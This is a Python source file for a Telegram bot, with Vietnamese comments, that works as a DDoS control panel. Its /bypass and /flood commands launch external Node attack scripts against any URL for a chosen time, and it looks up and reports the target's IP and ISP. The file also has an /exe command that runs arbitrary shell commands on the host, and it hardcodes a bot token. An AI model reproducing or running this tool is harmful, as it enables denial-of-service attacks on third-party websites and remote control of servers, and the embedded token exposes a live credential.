import subprocess 
import asyncio
import requests
import json
import socket
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse

# Cấu hình
ALLOWED_USER_ID = 7371969470  # ID của admin
TOKEN = '7785920819:AAFrfH6qbtSMzax0yLnpBCQMeCeGnDwyQgg'

# Quản lý tiến trình tấn công
processes, task_info = {}, {}

# Escape HTML
def escape_html(text):
    return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')

# Lấy IP và ISP thông tin
def get_ip_and_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        if ip:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            return ip, response.json() if response.ok else None
    except (socket.error, requests.exceptions.RequestException):
        return None, None

# Khởi chạy tấn công
async def run_attack(url, time, update, method):
    user_id = update.effective_user.id
    command = f"node {'thai.js' if method == 'bypass' else 'stroke.js'} {url} {time} 10 10 live.txt"
    process = subprocess.Popen(command, shell=True)
    processes.setdefault(user_id, []).append(process)
    task_info.setdefault(user_id, []).append({"task_id": process.pid, "url": url, "method": method, "remaining_time": time})

    for remaining in range(time, 0, -1):
        for info in task_info.get(user_id, []):
            if info["task_id"] == process.pid:
                info["remaining_time"] = remaining
        await asyncio.sleep(1)

    processes[user_id] = [p for p in processes[user_id] if p.pid != process.pid]
    task_info[user_id] = [info for info in task_info[user_id] if info["task_id"] != process.pid]

    await update.message.reply_text(f"Tấn công {method} vào URL {escape_html(url)} đã hoàn tất. ✅")

# Lệnh tấn công
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        url, time = context.args[0], int(context.args[1]) if len(context.args) > 1 else 60
        method = 'bypass' if '/bypass' in update.message.text else 'flood'
        
        if time > 60 and update.effective_user.id != ALLOWED_USER_ID:
            return await update.message.reply_text("⚠️ Thời gian tấn công tối đa là 60 giây.")
        
        ip, isp_info = get_ip_and_isp(url)
        if not ip:
            return await update.message.reply_text("❌ Không thể lấy IP từ URL.")
        
        isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else ''
        await update.message.reply_text(f"Tấn công {method} đã được gửi bởi @{update.effective_user.username}!\nThông tin ISP của host {escape_html(url)}\n<pre>{escape_html(isp_info_text)}</pre>", parse_mode='HTML')
        
        asyncio.create_task(run_attack(url, time, update, method))

    except (IndexError, ValueError) as e:
        await update.message.reply_text(f"❌ Đã xảy ra lỗi: {str(e)}")

# Dừng tiến trình tấn công
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not processes.get(user_id):
        return await update.message.reply_text("🛑 Không có tiến trình tấn công nào đang chạy.")
    
    subprocess.run("ps aux | grep 'stroke.js\\|thai.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    processes[user_id], task_info[user_id] = [], []
    await update.message.reply_text("✅ Tất cả các tấn công đã bị dừng.")

# Hiển thị các tiến trình tấn công đang chạy
async def task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_attacks = sum(len(info) for info in task_info.values())
    if total_attacks == 0:
        await update.message.reply_text("📋 Hiện tại không có tấn công nào đang diễn ra.")
    else:
        task_text = f"🔴 Hiện tại có {total_attacks} tiến trình tấn công đang diễn ra:\n"
        task_text += '\n'.join([f"URL: {escape_html(info['url'])}, Phương thức: {info['method']}, Thời gian còn lại: {info['remaining_time']} giây"
                                for infos in task_info.values() for info in infos])
        await update.message.reply_text(task_text)

# Thực thi lệnh terminal
async def exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ALLOWED_USER_ID:
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        if not context.args:
            return await update.message.reply_text("❌ Vui lòng cung cấp lệnh cần thực thi.")
        
        # Tạo lệnh từ input của người dùng
        command = " ".join(context.args)
        
        # Thực thi lệnh
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            output = result.stdout
        else:
            output = result.stderr
        
        # Nếu kết quả quá dài, gửi từng phần nhỏ
        if len(output) > 4096:
            for i in range(0, len(output), 4096):
                await update.message.reply_text(output[i:i+4096])
        else:
            await update.message.reply_text(output)
    
    except Exception as e:
        await update.message.reply_text(f"❌ Đã xảy ra lỗi khi thực thi lệnh: {str(e)}")

# Hiển thị hướng dẫn sử dụng bot
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_info = {
        "/task": "📝 Hiển thị thông tin về tấn công hiện tại của bạn.",
        "/bypass [url] [time]": "⚡ Tấn công Bypass vào URL với thời gian (giây).",
        "/flood [url] [time]": "🌊 Tấn công Flood vào URL với thời gian (giây).",
        "/stop": "⛔ Dừng tất cả tiến trình tấn công.",
        "/exe [lệnh]": "⚙️ Thực thi lệnh terminal và gửi kết quả về.",
        "/help": "ℹ️ Hiển thị hướng dẫn sử dụng bot."
    }
    await update.message.reply_text(f"<pre>{escape_html(json.dumps(help_info, indent=2, ensure_ascii=False))}</pre>", parse_mode='HTML')

# Khởi chạy bot
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("task", task))
    application.add_handler(CommandHandler("exe", exe))  # Thêm handler cho lệnh /exe
    application.add_handler(CommandHandler("help", help_command))
    application.run_polling()

if __name__ == "__main__":
    main()